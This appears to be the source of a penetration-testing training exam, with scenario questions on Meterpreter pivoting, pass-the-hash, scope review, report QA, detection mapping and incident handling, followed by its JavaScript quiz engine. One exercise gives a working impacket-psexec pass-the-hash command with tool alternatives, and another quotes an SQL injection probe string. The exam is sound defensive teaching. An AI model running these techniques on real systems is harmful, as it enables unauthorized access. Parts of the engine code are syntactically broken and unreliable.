 sc:'<p>You hold a Meterpreter session on DMZ-jump (10[.]60[.]9[.]10). The internal app tier lives at 10[.]60[.]10[.]0/24 and is unreachable from your Kali box except through this session. You need your local nmap and an SMB client to reach them. The RoE allows tunneling.</p>',
 q:'<p>Which combination is the correct, working approach?</p>',
 hint:'First teach Metasploit where the new network lives, then give your local tools a route through the session.',
 opts:[
  {id:'a', tx:'Add a route through the session, then proxy local tools over a SOCKS link'},
  {id:'b', tx:'Get SYSTEM first — an elevated session automatically routes internal nets'},
  {id:'c', tx:'Migrate into explorer.exe so local nmap reaches the internal /24 directly'},
  {id:'d', tx:'Run "route add" on the Kali box to reach the internal /24 through the DMZ'}
 ],
 a:'a',
 ex:'Autoroute adds the internal subnet as a route through the compromised session — Metasploit modules then know how to reach it, and a SOCKS proxy (with proxychains in front of nmap or smbclient) carries your ordinary local tools through the same path. portfwd maps single ports when that is all you need. The other options are noise: SYSTEM (b) changes privileges, not routing; migrating (c) changes processes, not routes; and (d) is simply false — Kali has no path to an RFC-internal network behind the DMZ host. An SSH -L local tunnel is the equivalent construction when your foothold is SSH instead of Meterpreter. Route first, tools second — pivoting is routing, not magic.'
},
{
 id:'H19', t:'fib', th:9, title:'Write the engagement narrative',
 sc:'<p>The Northwind report\'s "How we tested" section lost five words. The bank holds the five correct words plus three distractors. The narrative must survive an auditor\'s review.</p>',
 q:'<p>Fill all five blanks correctly.</p>',
 hint:'Blank 1: how much the client told you up front. Blank 2: the recon family. Blank 3: scan mode with accounts. Blank 4: the CVSS band. Blank 5: the future verification.',
 text:'(1) Because the client provided full documentation and credentials up front, this was a {{0}}-box engagement.\n(1b) Public-source {{1}} (Shodan, theHarvester, Recon-ng) shaped the target list.\n(2) Nessus ran in {{2}} mode using client-provided service accounts.\n(3) CVE-2024-21412 on the edge gateway was rated {{3}} and led the remediation plan.\n(4) All fixes will be verified during the {{4}} in eight weeks.',
 bank:['white','OSINT','credentialed','critical','retest','black','non-credentialed','low'],
 a:['white','OSINT','credentialed','critical','retest'],
 ex:'(1) Full documentation up front is the definition of white-box (black-box means you learn as an outsider, gray-box sits between). (1b) Shodan, theHarvester and Recon-ng are OSINT tooling — passive public-source recon that shaped the target list before any packet was sent (WHOIS and Google dorking live in the same bucket). (2) Scans that log in with service accounts are credentialed scans; they read patch state directly and cut false negatives. (3) A remotely exploitable, actively used edge-gateway flaw sits in the critical band and therefore leads the plan — even though CVSS must always be read with exposure in mind. (4) The retest is what converts a report into a closed loop. Distractors: black, non-credentialed and low are simply the wrong facts for this engagement — auditors check exactly these words.'
},
{
 id:'H20', t:'spot', th:0, title:'Spot the dangerous line in scope v3',
 sc:'<p>Northwind\'s legal team reworked the scope document after the acquisition. You read it line by line before signing. One line would expose your firm to unauthorized testing of systems the client cannot authorize.</p>',
 q:'<p>Click the one dangerous line.</p>',
 hint:'For each line ask: does the client own this, or merely reach it? Carriers, SaaS tenancy and shared ranges are classic traps.',
 code:[
  '# Northwind Health — External + Internal Test, Scope v3',
  'Client: Northwind Health Inc. (owned or leased systems only)',
  'In scope (internal): 10[.]60[.]2[.]0/24, 10[.]60[.]9[.]0/24, 10[.]60[.]10[.]0/24',
  'In scope (external): web01.northwindhealth.example, vpn.northwindhealth.example',
  'In scope: our ISP upstream carrier-NAT range 100[.]64[.]0[.]0/10 (we transit through it)',
  'Excluded: 10[.]62[.]4[.]5 (connected-medical devices VLAN) — scan never, report any accidental touch',
  'Window: business hours, Mon-Fri; emergency contact: SOC hotline 24/7'
 ],
 bad:[4],
 ex:'Line 5 claims the carrier-NAT range 100[.]64[.]0[.]0/10 — that address space belongs to the ISP, not to Northwind; "we transit through it" never means "we may test it", and anything reachable inside it belongs to other customers of the carrier. Lines 3-4 are proper scope (owned internal subnets, named external hosts). Line 6 is excellent practice: explicitly excluding the medical VLAN with a duty to report accidental contact is how you handle high-risk neighbors. Line 7 defines the window and the emergency contact path. The rule that catches line 5: a client can only authorize systems it owns or controls by contract — transit, adjacency and "reachable from" prove nothing.'
},
{
 id:'H21', t:'multi', th:9, title:'What never ships in the report',
 sc:'<p>Final QA on the Northwind deliverable before it goes out as a PDF. Your firm\'s QA checklist asks: which artifacts must be removed from any client-facing report? Some things are evidence; some things are liabilities.</p>',
 q:'<p>Select every artifact that must <strong>not</strong> appear in the client-facing report.</p>',
 hint:'Ask: if this PDF leaks, what damage does each item do — to users, to the client, to the world?',
 opts:[
  {id:'a', tx:'A dump of real employee salary rows used during testing'},
  {id:'b', tx:'The cracked plaintext passwords of real accounts'},
  {id:'c', tx:'CVSS scores and risk ratings for each finding'},
  {id:'d', tx:'Working source code of the unpatched 0-day you wrote'},
  {id:'e', tx:'Screenshots of your defanged PoC payloads'},
  {id:'f', tx:'The methodology section describing tools and versions'}
 ],
 a:['a','b','d'],
 ex:'(a) Real PII in a document creates a privacy incident of its own — exposure is proven with redacted samples, counts and metadata instead. (b) Cracked plaintext passwords let anyone impersonate those users; even "just the boss one" is a liability — the report says the password policy failed X% of accounts, without the passwords. (d) Reusable exploit source for an unpatched flaw turns the report into a weapon if it leaks; it stays under restricted disclosure with the vendor, never in a client PDF. (c) CVSS ratings, (e) defanged PoC screenshots (hxxp://, 10[.]60[.]...) and (f) methodology are all standard report content — they make findings verifiable without helping an attacker. QA\'s line: everything that proves the finding stays; everything that IS the danger goes.'
},
{
 id:'H22', t:'term', th:8, title:'Terminal — use the hash, not the password',
 sc:'<p>Your hashdump from a lab workstation produced NTLM hashes. The valuable one belongs to the service account <strong>svc_reports</strong>: LM aad3b435b51404eeaad3b435b51404ee, NT 8f3e4c9a2b7d5e1f (saved in /root/notes.txt). The file server FS01 (10[.]60[.]2[.]5) accepts that account. Your task: prove access to FS01 as svc_reports <strong>without ever cracking or knowing the plaintext password</strong>. The exercise checks your command.</p>',
 q:'<p>Type a command that authenticates to FS01 using the NTLM hash directly. No tool name is given — pick the technique and the tool yourself.</p>',
 hint:'The technique name starts with "pass the ...". Popular tools for it: Impacket\'s psexec/smbexec family (-hashes), CrackMapExec (-H), or mimikatz\'s sekurlsa::pth.',
 banner:'root@kali:~#',
 fs:{'/root/notes.txt':'Captured: svc_reports NTLM hash aad3b435b51404eeaad3b435b51404ee:8f3e4c9a2b7d5e1f\nFS01 = 10[.]60[.]2[.]5 (SMB 445 open)'},
 tasks:[
  {desc:'Authenticate to FS01 (10[.]60[.]2[.]5) as svc_reports with the NTLM hash, no plaintext password.',
   all:[/(psexec|smbexec|wmiexec|atexec|dcomexec|crackmapexec|cme|pth-|winexe|impacket|sekurlsa::pth|smbclient)/i, /(-hashes|--hashes|\s-H\s|\s-H$|:aad3b435b51404ee|sekurlsa::pth|ntlm:\S+|--pw-nt-hash)/i, /(10\[?\.\]?60\[?\.\]?2\[?\.\]?5|fs01)/i],
   none:[], sol:'impacket-psexec svc_reports@10[.]60[.]2[.]5 -hashes aad3b435b51404eeaad3b435b51404ee:8f3e4c9a2b7d5e1f'}
 ],
 ex:'Pass the hash works because Windows authenticates with the NT hash, not the typed password: present the hash over SMB and you are in. Accepted answers include the Impacket family (psexec.py / smbexec / wmiexec with -hashes lm:nt), CrackMapExec/cme with -H, pth-* tools, smbclient with --pw-nt-hash, or mimikatz sekurlsa::pth. Cracking is not needed — which is exactly why defenders treat dumped hashes as password-equivalent secrets and why controls like Credential Guard matter. The exercise also proves a reporting point: the finding is "an attacker with admin-level hash access owns the file server", not "passwords were weak".'
},
{
 id:'H23', t:'rank', th:1, title:'Order the hosts by attack priority',
 sc:'<p>The recon dossier on five in-scope hosts is on your desk. It was assembled the professional way: the passive week produced WHOIS and certificate records that mapped the netblocks, Shodan banner data that flagged internet-facing services, theHarvester plus a LinkedIn sweep that built the user list, and a Google dork ("intitle:Jenkins") that surfaced the script console — all linked into one footprint graph in Maltego. An active scan pass then confirmed the facts. You have time to deeply attack two of them today; the debrief wants your ordering justified. Facts from the dossier: (1) Jenkins on the DMZ, unauthenticated script console, internet-facing; (2) the VPN gateway, recent pre-auth CVE with public exploit, internet-facing; (3) the backup server, CVSS 8.1 flaw but internal-only and requires a foothold first; (4) internal DNS, fully patched, SNMP community "public" still answers; (5) the dev box, default credentials, but it sits in an isolated lab VLAN with no route to anything else.</p>',
 q:'<p>Rank the hosts from best first target (top) to worst (bottom).</p>',
 hint:'Exposure first, then effort, then what the host unlocks — the dossier hands you all three. A locked-down isolated box can be last even with weak creds.',
 items:[
  'Jenkins script console — unauthenticated, internet-facing, code execution now',
  'VPN gateway — pre-auth CVE with public exploit, internet-facing',
  'Backup server — 8.1 internal flaw, needs an existing foothold',
  'Internal DNS — patched; only SNMP "public" leaks device info',
  'Dev box — default creds but isolated VLAN, nothing to unlock'
 ],
 ex:'Credit the dossier first: passive OSINT (WHOIS, Shodan banners, theHarvester, dorking — organized in Maltego or Recon-ng) bought exposure and certainty without sending a single packet, which is what good footprinting is for; only the active pass confirmed versions. Jenkins first: unauthenticated code execution on an internet-facing host is immediate, reliable access — nothing else on the list beats that combination. The VPN gateway second: pre-auth plus a public exploit also means direct internet attack, just slightly less certain (patch timing and exploit reliability to verify). The backup server third: high severity, but it needs a foothold you do not yet have — a target for later in the chain, not a first move. DNS fourth: patched, and the SNMP "public" string is information leakage to document, not a break-in. The dev box last despite default credentials: isolation means even success yields nothing, and locking that down is a five-minute fix for the client. Priority = exposure × certainty × what success unlocks.'
},
/* ================= HARD — exercises 24-30 ================= */
{
 id:'H24', t:'match', th:8, title:'The control that would have caught you',
 sc:'<p>After the Northwind purple-team exercise, each red-team action is paired with the detective control that flagged it — and, for the debrief slide, with the technique name it actually demonstrates. You get the detections; supply the technique each one exposes.</p>',
 q:'<p>Match each detection to the attacker technique it caught.</p>',
 hint:'One is about spraying, one about touching a fake share, one about a document spawning a shell, one about probing a parameter, one about shrinking logs.',
 lefts:['SIEM rule: many 4625 failures across DIFFERENT accounts from one IP, 1-2 tries each','Canary share \\CANARY$ touched from a workstation that has no business reading it','EDR: WINWORD.EXE spawned cmd.exe with an encoded command line','WAF: burst of 403s on /search?q=%27%20OR%201%3D1','auditd: /var/log/auth.log truncated by an unexpected process'],
 rights:['Clearing tracks (log tampering)','Password spraying','SMB share enumeration / lateral recon','SQL injection probing','Malicious document execution'],
 a:[1,2,4,3,0],
 ex:'The 4625 pattern with different accounts and a single source is the signature of password spraying — the inverse (one account, many tries) is brute force. Touching a canary share exposes SMB enumeration and lateral recon: nobody legitimate reads a share named CANARY. A word processor spawning a shell is malicious document execution — the classic phishing payload. The WAF burst on /search with OR 1=1 is SQL injection probing, blocked but still worth alerting. And a truncated auth.log is clearing tracks: attackers shrink their footprint right before finishing. Note the dual lesson for your own ops: these five controls catch five different tactic families, and each needs its own detection — there is no single sensor for "an attacker".'
},
{
 id:'H25', t:'qcm', th:0, title:'Something is already leaving the building',
 sc:'<p>Day 4, 11:20. While reviewing proxy logs (in scope), you notice a REAL, ongoing beaconing pattern from a client workstation to an unknown external domain — long random subdomains, TXT-heavy DNS. This is not your team: none of your tooling runs on that host. It looks like live malware exfiltrating data. Your RoE: "analysts who discover indications of a third-party security incident must pause related activity and use the deconfliction contact immediately; document all observations."</p>',
 q:'<p>What is the correct first action?</p>',
 hint:'This is no longer your exercise. Whose incident is it, and what does the RoE say about discovery?',
 opts:[
  {id:'a', tx:'Pause testing and call the deconfliction contact now; document what you saw'},
  {id:'b', tx:'Continue testing around it quietly — not your assignment, not your business'},
  {id:'c', tx:'Notify the client\'s whole company by email so users can unplug their machines'},
  {id:'d', tx:'Block the domain on the client firewall yourself to stop the leak now'}
 ],
 a:'a',
 ex:'The discovery triggers the RoE\'s incident clause exactly: pause related activity, call the deconfliction contact (the agreed single channel), and document timestamps and indicators. Staying silent (b) leaves a live data breach running while you knew about it — an ethical and legal failure. A company-wide email (c) blows the agreed communication path, risks tipping the actor, and is not your authority. Taking response actions yourself (d) alters evidence and client infrastructure without mandate — the client\'s IR team owns that decision. Professionals hand discoveries over cleanly: what you saw, when, with which indicators — then step back. This is the deconfliction discipline that separates pentesting from vigilantism.'
},
{
 id:'H26', t:'order', th:9, title:'Verify the fixes — the retest loop',
 sc:'<p>Eight weeks after delivery, Northwind says the critical findings are "fixed" and asks for the retest. Your job: turn four fixes into four closed findings — or reopen them. One finding was the unauthenticated SQLi on the appointment API.</p>',
 q:'<p>Put the five retest steps in the correct order.</p>',
 hint:'Same conditions as the original test, then the same test, then honest paperwork.',
 items:[

/* ================= Cyber Pulse Academy exam engine (vanilla JS, self-contained) ================= */
'use strict';
var E = EXERCISES, EX = EXAM;
var S = {
  phase: 'intro', order: [], cur: 0, ans: [],
  started: false, finished: false, reported: false,
  tLimit: 0, tLeft: 0, tick: null,
  manualPause: false, checkPause: false,
  username: '', selItem: null
};
function $(id){ return document.getElementById(id); }
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
function sh(arr){ var a = arr.slice(), i, j, t; for (i = a.length - 1; i > 0; i--) { j = Math.floor(Math.random() * (i + 1)); t = a[i]; a[i] = a[j]; a[j] = t; } return a; }
function el(tag, cls, html){ var d = document.createElement(tag); if (cls) d.className = cls; if (html != null) d.innerHTML = html; return d; }
function icons(st){ return st === 'ok' ? '✓' : (st === 'bad' ? '✗' : (st === 'warn' ? '⚠' : '')); }

/* ---------------- planning (shuffle per attempt) ---------------- */
function makePlan(ex){
  var p = {};
  if (ex.t === 'qcm' || ex.t === 'multi') p.ord = sh(ex.opts.map(function(o,i){ return i; }));
  if (ex.t === 'dnd') p.ord = sh(ex.items.map(function(o,i){ return i; }));
  if (ex.t === 'match') p.rord = sh(ex.rights.map(function(o,i){ return i; }));
  if (ex.t === 'order' || ex.t === 'rank') { var init; do { init = sh(ex.items.map(function(o,i){ return i; })); } while (sameArr(init, ex.items.map(function(o,i){ return i; }))); p.init = init; }
  if (ex.t === 'fib') p.bord = sh(ex.bank.map(function(o,i){ return i; }));
  return p;
}
function sameArr(a,b){ if (!a || a.length !== b.length) return false; for (var i=0;i<a.length;i++){ if (a[i]!==b[i]) return false; } return true; }
function defaultVal(ex, plan){
  switch (ex.t) {
    case 'qcm': return null;
    case 'multi': return [];
    case 'dnd': return {};
    case 'match': return ex.lefts.map(function(){ return -1; });
    case 'order': case 'rank': return plan.init.slice();
    case 'fib': return ex.bank.map(function(){ return ''; }).slice(0, ex.a.length);
    case 'term': return [];
    case 'logview': case 'spot': return [];
    case 'branch': return ex.steps.map(function(){ return null; });
    case 'sim': return ex.cards.map(function(){ return null; });
  }
  return null;
}
function touchedVal(ex, v){
  if (v == null) return false;
  switch (ex.t) {
    case 'qcm': return v != null;
    case 'multi': case 'logview': case 'spot': case 'term': return v.length > 0;
    case 'dnd': return Object.keys(v).length > 0;
    case 'match': return v.some(function(x){ return x >= 0; });
    case 'order': case 'rank': return true; /* plan-init means untouched -> handled via .touched flag */
    case 'fib': return v.some(function(x){ return x !== ''; });
    case 'branch': return v.some(function(x){ return x != null; });
    case 'sim': return v.some(function(x){ return x != null; });
  }
  return false;
}

/* ---------------- scoring ---------------- */
function computeScore(ex, a){
  var v = a.val, marks = [], n = 0, N = 1, i, k, st;
  function mk(key, st){ marks.push({ k: key, st: st }); if (st === 'ok') n++; }
  switch (ex.t) {
    case 'qcm':
      N = 1;
      n = (v === ex.a) ? 1 : 0;
      ex.opts.forEach(function(o){ var st = o.id === ex.a ? 'ok' : (o.id === v ? 'bad' : null); if (st) marks.push({ k: o.id, st: st }); });
      break;
    case 'multi':
      N = ex.a.length;
      ex.opts.forEach(function(o){
        var sel = v.indexOf(o.id) >= 0, good = ex.a.indexOf(o.id) >= 0;
        mk(o.id, good && sel ? 'ok' : (good ? 'warn' : (sel ? 'bad' : null)));
      });
      break;
    case 'dnd':
      N = ex.slots.length;
      ex.slots.forEach(function(s, si){ var put = v[s.id]; mk(s.id, put === ex.a[s.id] ? 'ok' : (put ? 'bad' : 'warn')); });
      break;
    case 'match':
      N = ex.lefts.length;
      ex.lefts.forEach(function(L, li){ var put = v[li]; mk(String(li), put === ex.a[li] ? 'ok' : (put >= 0 ? 'bad' : 'warn')); });
      break;
    case 'order': case 'rank':
      N = ex.items.length;
      for (i = 0; i < N; i++) mk(String(i), v[i] === i ? 'ok' : 'bad');
      break;
    case 'fib':
      N = ex.a.length;
      ex.a.forEach(function(w, gi){ mk(String(gi), v[gi] === w ? 'ok' : 'bad'); });
      break;
    case 'term':
      N = ex.tasks.length;
      ex.tasks.forEach(function(t, ti){ mk(String(ti), taskMatch(t, v) ? 'ok' : 'bad'); });
      break;
    case 'logview': case 'spot': {
      N = ex.bad.length;
      var badSet = {}; ex.bad.forEach(function(b){ badSet[b] = true; });
      if (ex.t === 'spot' && N === 1) {
        /* single-answer "spot the mistake": all-or-nothing, one mark on the answer line */
        var picked = v.length ? v[0] : null;
        mk(String(ex.bad[0]), picked === ex.bad[0] ? 'ok' : 'warn');
        if (picked != null && picked !== ex.bad[0]) mk(String(picked), 'bad');
      } else {
        (ex.t === 'logview' ? ex.lines : ex.code).forEach(function(L, li){ if (badSet[li]) { mk(String(li), v.indexOf(li) >= 0 ? 'ok' : 'warn'); } else if (v.indexOf(li) >= 0) mk(String(li), 'bad'); });
      }
      break;
    }
    case 'branch':
      N = ex.steps.length;
      ex.steps.forEach(function(s, si){ var c = v[si]; mk(String(si), c == null ? 'warn' : (s.opts[c].ok ? 'ok' : 'bad')); });
      break;
    case 'sim':
      N = ex.cards.length;
      ex.cards.forEach(function(c, ci){ var x = v[ci]; mk(String(ci), x == null ? 'warn' : (c.opts[x].ok ? 'ok' : 'bad')); });
      break;
  }
  var frac = N ? n / N : 0;
  var earned = Math.max(0, Math.round((frac - 0.1 * a.hints) * 100) / 100);
  return { n: n, N: N, marks: marks, earned: earned };
}
function taskMatch(t, hist){
  /* Only the commands the student typed are validated — never the sandbox output,
     so a matching output line can never accidentally satisfy a task. */
  var cmds = hist.filter(function(l){ return l.indexOf('\u0001') !== 0 && l.indexOf('\u0002') !== 0; });
  for (var i = 0; i < cmds.length; i++) {
    var line = cmds[i], ok = true, j;
    if (t.all) for (j = 0; j < t.all.length; j++) { if (!t.all[j].test(line)) { ok = false; break; } }
    if (ok && t.none) for (j = 0; j < t.none.length; j++) { if (t.none[j].test(line)) { ok = false; break; } }
    if (ok) return true;
  }
  return false;
}
function liveScore(){
  var s = 0, inc = 0;
  S.order.forEach(function(ix){ var a = S.ans[ix]; if (a.locked) { s += a.locked.earned; inc++; } });
  return { s: Math.round(s * 100) / 100, inc: inc };
}

/* ---------------- timer ---------------- */
function fmtT(sec){ sec = Math.max(0, sec); var m = Math.floor(sec / 60), s2 = sec % 60; return (m < 10 ? '0' + m : m) + ':' + (s2 < 10 ? '0' + s2 : s2); }
function tickTimer(){
  if (S.finished || S.manualPause || S.checkPause) { updPauseUI(); return; }
  S.tLeft--;
  $('tDisp').textContent = fmtT(S.tLeft);
  if (S.tLeft <= 60) $('timerChip').classList.add('tlow');
  else $('timerChip').classList.remove('tlow');
  if (S.tLeft <= 0) finish('time');
}
function updPauseUI(){
  var p = $('pauseState'), parts = [];
  if (S.manualPause) parts.push('<span class="pstate man">⏸ Paused (manual) — content hidden</span>');
  if (S.checkPause) parts.push('<span class="pstate">🕒 Timer paused — review mode</span>');
  if (parts.length) { p.innerHTML = parts.join(' '); p.hidden = false; }
  else p.hidden = true;
  $('btnPause').setAttribute('aria-pressed', S.manualPause ? 'true' : 'false');
  $('btnPause').innerHTML = S.manualPause ? '▶ Resume' : '⏸ Pause';
  $('tDisp').textContent = fmtT(S.tLeft);
}

/* ---------------- exam flow ---------------- */
function startExam(){
  S.order = sh(E.map(function(e, i){ return i; }));
  S.ans = E.map(function(ex){ var plan = makePlan(ex); return { val: defaultVal(ex, plan), plan: plan, locked: null, skipped: false, hints: 0, touched: false, revising: false }; });
  S.cur = 0; S.started = true; S.finished = false; S.reported = false;
  S.tLimit = EX.minutes * 60; S.tLeft = S.tLimit;
  S.manualPause = false; S.checkPause = false; S.selItem = null;
  $('timerChip').classList.remove('tlow');
  if (S.tick) clearInterval(S.tick);
  S.tick = setInterval(tickTimer, 1000);
  $('intro').hidden = true; $('results').hidden = true; $('hd').hidden = false; $('stageWrap').hidden = false;
  $('hdTitle').textContent = EX.hdTitle;
  buildNav(); updScore(); updProgress(); renderEx();
  window.scrollTo(0, 0);
}
function curEx(){ return E[S.order[S.cur]]; }
function curAns(){ return S.ans[S.order[S.cur]]; }

function buildNav(){
  var nav = $('nav'); nav.innerHTML = '';
  S.order.forEach(function(ix, pos){
    var b = document.createElement('button');
    b.type = 'button'; b.className = 'nbtn'; b.textContent = String(pos + 1);

    b.dataset.ix = ix;
    nav.appendChild(b);
  });

}
function updNav(){
  var chips = $('nav').children;
  S.order.forEach(function(ix, pos){
    var a = S.ans[ix], b = chips[pos], cls = '', ic = '', lab = 'Question ' + (pos + 1) + ': not answered';
    if (a.locked) {
      var r = computeScore(E[ix], { val: a.locked.val, hints: a.locked.hints });
      if (r.n === r.N) { cls = 'fullok'; ic = '✓'; lab = 'checked, fully correct'; }
      else if (r.n > 0) { cls = 'partial'; ic = '◐'; lab = 'checked, partially correct'; }
      else { cls = 'fullbad'; ic = '✗'; lab = 'checked, zero'; }
    } else if (a.skipped) { cls = 'skipf'; ic = '⚠'; lab = 'skipped'; }
    if (pos === S.cur) cls += ' cur';
    b.className = 'nbtn ' + cls;
    b.innerHTML = (pos + 1) + (ic ? '<span class="ic" aria-hidden="true">' + ic + '</span>' : '');
    b.setAttribute('aria-label', lab);
    b.title = lab;
  });
}
function updScore(){
  var ls = liveScore();
  $('sDisp').textContent = (Math.round(ls.s * 10) / 10).toFixed(1);
  var done = 0;
  S.order.forEach(function(ix){ var a = S.ans[ix]; if (a.locked || a.skipped) done++; });
  var pct = Math.round(done / E.length * 100);
  $('pfill').style.width = pct + '%';
  $('pbarEl').setAttribute('aria-valuenow', pct);
  var th = {};
  S.order.forEach(function(ix){ var ex = E[ix]; th[ex.th] = th[ex.th] || { d: 0, t: 0 }; th[ex.th].t++; if (S.ans[ix].locked) th[ex.th].d++; });
  var html = '';
  Object.keys(th).forEach(function(k){
    var nm = THEMES[k] ? THEMES[k].t.split(' ')[0] : ('T' + k);
    html += '<span class="tchip">' + esc(nm) + ' <b>' + th[k].d + '/' + th[k].t + '</b></span>';
  });
  $('themeChips').innerHTML = html;
}
function updProgress(){ updNav(); updScore(); }

function gotoQ(pos){
  if (S.finished) return;
  /* Leaving the current exercise ends its Check-pause (review mode) and any
     in-progress revision; the timer resumes unless manual pause is active. */
  if (S.order[S.cur] != null && S.ans[S.order[S.cur]]) S.ans[S.order[S.cur]].revising = false;
  S.checkPause = false;
  S.cur = pos; S.selItem = null;

}
function smoothTop(){

  window.scrollTo({ top: 0, behavior: rm ? 'auto' : 'smooth' });
}
function nextQ(){

  else { var st = $('btnSubmit'); st.classList.add('primary'); st.focus(); toast('Last question reached — press Submit when ready.'); }
}
function prevQ(){ if (S.cur > 0) gotoQ(S.cur - 1); }
function toast(msg){
  var d = el('div', 'fb warf', '<span class="big">' + esc(msg) + '</span>');
  d.setAttribute('role', 'status');
  d.style.position = 'fixed'; d.style.bottom = '18px'; d.style.left = '50%'; d.style.transform = 'translateX(-50%)'; d.style.zIndex = '80';

/* ---------------- render ---------------- */
function renderEx(){
  var ex = curEx(), a = curAns(), pos = S.cur;
  var stage = $('stage'); stage.innerHTML = '';
  var locked = a.locked && !a.revising;
  var wrap = el('div');
  wrap.appendChild(el('p', null, '<span class="tagchip">Question ' + (pos + 1) + ' of ' + E.length + '</span><span class="tagchip">' + esc(THEMES[ex.th].t) + '</span><span class="tagchip">' + esc(ex.title) + '</span>'));
  var scn = el('div', 'scn', '<p class="lbl">Scenario / Context</p>' + ex.sc);
  var q = el('div', 'qblk', '<p class="lbl">Question</p>' + ex.q);
  var ansl = el('div', 'card');
  ansl.appendChild(el('p', 'lbl anslbl', answerLabel(ex.t)));
  var body = el('div');
  buildBody[ex.t](body, ex, a, locked);
  ansl.appendChild(body);
  wrap.appendChild(scn); wrap.appendChild(q); wrap.appendChild(ansl);
  /* persistent hint: stays visible through re-renders once used */
  if (a.hints > 0) wrap.appendChild(el('div', 'fb warf', '<span class="big">💡 Hint (−10% of this exercise):</span> ' + esc(ex.hint || 'Read the scenario once more and watch for words like "not", "except", "only".')));

  /* controls */
  var ctl = el('div', 'ctlbar');
  var bPrev = mkBtn('◀ Prev', 'btn ghost', prevQ); bPrev.disabled = pos === 0;
  var bCheck = mkBtn('✓ Check', 'btn primary', function(){ doCheck(); });
  var bRev = mkBtn('✎ Revise', 'btn', function(){ doRevise(); });
  var bHint = mkBtn('💡 Hint (−10%)', 'btn', function(){ doHint(); });
  var bSkip = mkBtn('⏭ Skip', 'btn ghost', function(){ doSkip(); });
  var bNext = mkBtn('Next ▶', 'btn okk', function(){ nextQ(); });
